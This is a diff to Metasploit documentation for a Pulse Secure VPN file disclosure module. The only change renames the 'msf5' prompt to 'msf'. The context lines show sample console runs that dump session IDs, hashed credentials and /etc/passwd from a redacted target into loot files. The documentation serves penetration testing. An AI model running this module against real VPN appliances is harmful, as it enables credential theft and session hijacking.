@@ -40,7 +40,7 @@ Whether to print file contents to the screen. Valid only in manual mode.
 Dumping creds and sessions in automatic mode:
 
 ```
-msf5 auxiliary(gather/pulse_secure_file_disclosure) > run
+msf auxiliary(gather/pulse_secure_file_disclosure) > run
 [*] Running module against [redacted]
 
 [*] Running in automatic mode
@@ -61,7 +61,7 @@ msf5 auxiliary(gather/pulse_secure_file_disclosure) > run
 [*] Dumping /data/runtime/mtmp/system
 [+] /Users/wvu/.msf4/loot/20191029221851_default_[redacted]_PulseSecureVPN_530345.bin
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/pulse_secure_file_disclosure) > loot
+msf auxiliary(gather/pulse_secure_file_disclosure) > loot
 
 Loot
 ====
@@ -72,15 +72,15 @@ host         service  type                                        name          
 [redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/lmdb/randomVal/data.mdb  application/octet-stream  Session IDs            /Users/wvu/.msf4/loot/20191029221845_default_[redacted]_PulseSecureVPN_607925.mdb
 [redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/system                   application/octet-stream  Hashed credentials     /Users/wvu/.msf4/loot/20191029221851_default_[redacted]_PulseSecureVPN_530345.bin
 
-msf5 auxiliary(gather/pulse_secure_file_disclosure) >
+msf auxiliary(gather/pulse_secure_file_disclosure) >
 ```
 
 Dumping default `/etc/passwd` in manual mode:
 
 ```
-msf5 auxiliary(gather/pulse_secure_file_disclosure) > set action Manual
+msf auxiliary(gather/pulse_secure_file_disclosure) > set action Manual
 action => Manual
-msf5 auxiliary(gather/pulse_secure_file_disclosure) > run
+msf auxiliary(gather/pulse_secure_file_disclosure) > run
 [*] Running module against [redacted]
 
 [*] Running in manual mode
@@ -97,5 +97,5 @@ postgres:x:102:102:PostgreSQL User:/:
 
 [+] /Users/wvu/.msf4/loot/20191029222949_default_[redacted]_PulseSecureVPN_073170.bin
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/pulse_secure_file_disclosure) >
+msf auxiliary(gather/pulse_secure_file_disclosure) >
 ```
